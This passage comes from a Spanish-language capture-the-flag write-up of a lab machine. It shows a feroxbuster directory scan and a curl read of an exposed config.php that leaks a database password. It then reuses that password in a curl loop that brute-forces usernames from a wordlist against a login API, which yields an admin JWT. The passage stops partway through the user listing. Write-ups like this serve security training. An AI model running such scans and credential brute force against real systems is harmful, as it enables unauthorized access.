</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span> ğŸ“–  Wordlist              â”‚ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span> ğŸ‘Œ  Status Codes          â”‚ All Status Codes!
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span> ğŸ’¥  Timeout (secs)        â”‚ <span style="color:#ff0;font-weight:bold">7</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.4
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span> ğŸ”  Extract Links         â”‚ <span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span> ğŸ’²  Extensions            â”‚ [php]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span> ğŸ  HTTP methods          â”‚ [GET]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span> ğŸ”ƒ  Recursion Depth       â”‚ <span style="color:#ff0;font-weight:bold">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span><span style="color:#ff0;font-weight:bold">404</span>      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span><span style="color:#ff0;font-weight:bold">403</span>      GET        9l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET       29l       99w      927c http://10.129.96.55/js/scrolling-nav.js
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET       40l       77w      793c http://10.129.96.55/css/signin.css
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET       12l       32w      323c http://10.129.96.55/css/scrolling-nav.css
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        7l      965w    76308c http://10.129.96.55/vendor/bootstrap/js/bootstrap.bundle.min.js
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        6l     1429w   121200c http://10.129.96.55/css/bootstrap.min.css
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET        7l       20w      235c http://10.129.96.55/member =&gt; http://10.129.96.55/member/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET       39l      118w     1593c http://10.129.96.55/login.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span><span style="color:#ff0;font-weight:bold">401</span>      GET       12l       46w      381c http://10.129.96.55/management
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET        7l       20w      232c http://10.129.96.55/css =&gt; http://10.129.96.55/css/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET        7l       20w      231c http://10.129.96.55/js =&gt; http://10.129.96.55/js/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET        7l       20w      235c http://10.129.96.55/vendor =&gt; http://10.129.96.55/vendor/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        6l       25w      202c http://10.129.96.55/config.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET      108l      240w     3138c http://10.129.96.55/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET       21l      172w     1093c http://10.129.96.55/LICENSE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span><span style="color:#ff0;font-weight:bold">404</span>      GET        7l       25w      203c http://10.129.96.55/%20.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>ğŸš¨ Caught ctrl+c ğŸš¨ saving scan state to ferox-http_10_129_96_55-1722890241.state ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>[<span style="color:#007f7f">##&gt;-----------------] - 17s    22962/220575  3m      found:15      errors:20     </span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>[<span style="color:#007f7f">#&gt;------------------] - 17s    11436/220545  688/s   http://10.129.96.55/ </span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>[<span style="color:#007f7f">####################] - 0s    220545/220545  926660/s http://10.129.96.55/css/ =&gt; Directory listing</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>[<span style="color:#007f7f">####################] - 0s    220545/220545  2864221/s http://10.129.96.55/vendor/ =&gt; Directory listing</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>[<span style="color:#007f7f">####################] - 0s    220545/220545  5513625/s http://10.129.96.55/member/ =&gt; Directory listing</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span>[<span style="color:#007f7f">####################] - 0s    220545/220545  5513625/s http://10.129.96.55/js/ =&gt; Directory listing</span></span></span></code></pre></div>
<p>Vemos una ruta <code>/management</code> y otra <code>/member</code> que me llaman la atenciÃ³n.</p>
<p>Vemos un <code>config.php</code> que sospechosamente nos reporta que tiene contenido.</p>
<p>Genial..</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl http://10.129.96.55/config.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>$dbHost = <span style="color:#0ff;font-weight:bold">&#39;localhost&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>$dbUsername = <span style="color:#0ff;font-weight:bold">&#39;root&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>$dbPassword  = <span style="color:#0ff;font-weight:bold">&#39;Zk6heYCyv6ZE9Xcg&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>$db = <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(<span style="color:#0ff;font-weight:bold">&#34;Connect failed: %s\n&#34;</span>. $conn -&gt; error);</span></span></code></pre></div>
<p>Tenemos una credencial <code>Zk6heYCyv6ZE9Xcg</code>
No sabemos para quÃ© aÃºn.</p>
<p>No consigo iniciar sesiÃ³n en este panel.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>El endpoint de <code>/management</code> tambiÃ©n estÃ¡ protegido y no consigo iniciar sesiÃ³n.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>La ruta <code>/member</code> estÃ¡ vacia.</p>
<h1 id="3000tcp--8000tcp">3000/TCP &amp; 8000/TCP</h1>
<p>Por el puerto :3000 parece que hay una API por detrÃ¡s.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Por el puerto :8000 hay un CMS llamado Ajenti.
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Hay varias vulnerabilidades asociadas a Ajenti, pero necesito estar autenticado.
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>DecidÃ­ investigar un poco mas la API.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -X GET http://10.129.96.55:3000 -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: test&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{<span style="color:#0ff;font-weight:bold">&#34;success&#34;</span>:false,<span style="color:#0ff;font-weight:bold">&#34;message&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;Token is not valid&#34;</span>}</span></span></code></pre></div>
<p>IntentÃ© varias cosas pero nada funcionÃ³, asÃ­ que vamos a fuzzear a ver si encontramos algÃºn endpoint curioso.</p>
<p><img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Vemos un endpoint <code>/users</code> pero necesito estar autenticado</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -X GET http://10.129.96.55:3000/users -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: &#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{<span style="color:#0ff;font-weight:bold">&#34;success&#34;</span>:false,<span style="color:#0ff;font-weight:bold">&#34;message&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;Auth token is not supplied&#34;</span>}</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;username=root&amp;password=test&#34;</span>Forbiddenâ”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/luke/content]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>â””â”€â”€â•¼ [â˜…]$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;user=root&amp;password=test&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Bad Requestâ”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/luke/content]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>â””â”€â”€â•¼ [â˜…]$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;username=root&amp;password=test&#34;</span>Forbiddenâ”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/luke/content]</span></span></code></pre></div>
<p>Deduzco que la data se la tengo que mandar en formato <code>x-www-form-urlencoded</code> y que los campos son <code>username</code> y <code>password</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;username=root&amp;password=test&#34;</span>Forbiddenâ”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/luke/content]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>â””â”€â”€â•¼ [â˜…]$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;user=root&amp;password=test&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Bad Requestâ”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/luke/content]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>â””â”€â”€â•¼ [â˜…]$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;username=root&amp;password=test&#34;</span>Forbiddenâ”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/luke/content]</span></span></code></pre></div>
<p>Intento iniciar sesiÃ³n con las credenciales que ya tenÃ­a.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;username=root&amp;password=Zk6heYCyv6ZE9Xcg&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Forbiddenâ”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/luke/content]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>â””â”€â”€â•¼ [â˜…]$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;username=chihiro&amp;password=Zk6heYCyv6ZE9Xcg&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Forbiddenâ”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/luke/content]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>â””â”€â”€â•¼ [â˜…]$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;username=derry&amp;password=Zk6heYCyv6ZE9Xcg&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>Forbidden</span></span></code></pre></div>
<p>Y nada. AsÃ­ que probÃ© a hacer una pequeÃ±a fuerza bruta&hellip;</p>
<p>Y sorprendentemente funcionÃ³.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ <span style="color:#fff;font-weight:bold">for</span> username in <span style="color:#fff;font-weight:bold">$(</span>cat /opt/SecLists/Usernames/cirt-default-usernames.txt | awk <span style="color:#0ff;font-weight:bold">&#39;{print tolower($0)}&#39;</span><span style="color:#fff;font-weight:bold">)</span>; <span style="color:#fff;font-weight:bold">do</span> <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34; -&gt; </span>$username<span style="color:#0ff;font-weight:bold">&#34;</span>; curl -X POST http://10.129.96.55:3000/login --data <span style="color:#0ff;font-weight:bold">&#34;username=</span>$username<span style="color:#0ff;font-weight:bold">&amp;password=Zk6heYCyv6ZE9Xcg&#34;</span>; <span style="color:#fff;font-weight:bold">done</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span> -&gt; !root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Forbidden -&gt; $aloc$
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Forbidden -&gt; $srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Forbidden -&gt; $system
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>Forbidden -&gt; (null)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>Forbidden -&gt; (any)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Forbidden -&gt; (created)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">11111111</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>Forbidden -&gt; 12.x
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">1502</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">18140815</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>Forbidden -&gt; 1nstaller
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">22222222</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">30</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">31994</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>Forbidden -&gt; 4dgifts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">5</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>Forbidden -&gt; 6.x
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>Forbidden -&gt; <span style="color:#ff0;font-weight:bold">7</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>Forbidden -&gt; adams
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>Forbidden -&gt; adldemo
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>Forbidden -&gt; admin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>{<span style="color:#0ff;font-weight:bold">&#34;success&#34;</span>:true,<span style="color:#0ff;font-weight:bold">&#34;message&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;Authentication successful!&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;token&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y&#34;</span>} -&gt; administrator</span></span></code></pre></div>
<p>Ahora podemos ver mas usuarios&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ curl -s -X GET http://10.129.96.55:3000/users -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y&#39;</span> | jq
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>[
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>    <span style="color:#0ff;font-weight:bold">&#34;ID&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;1&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>    <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Admin&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>    <span style="color:#0ff;font-weight:bold">&#34;Role&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Superuser&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>  },
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    <span style="color:#0ff;font-weight:bold">&#34;ID&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;2&#34;</span>,
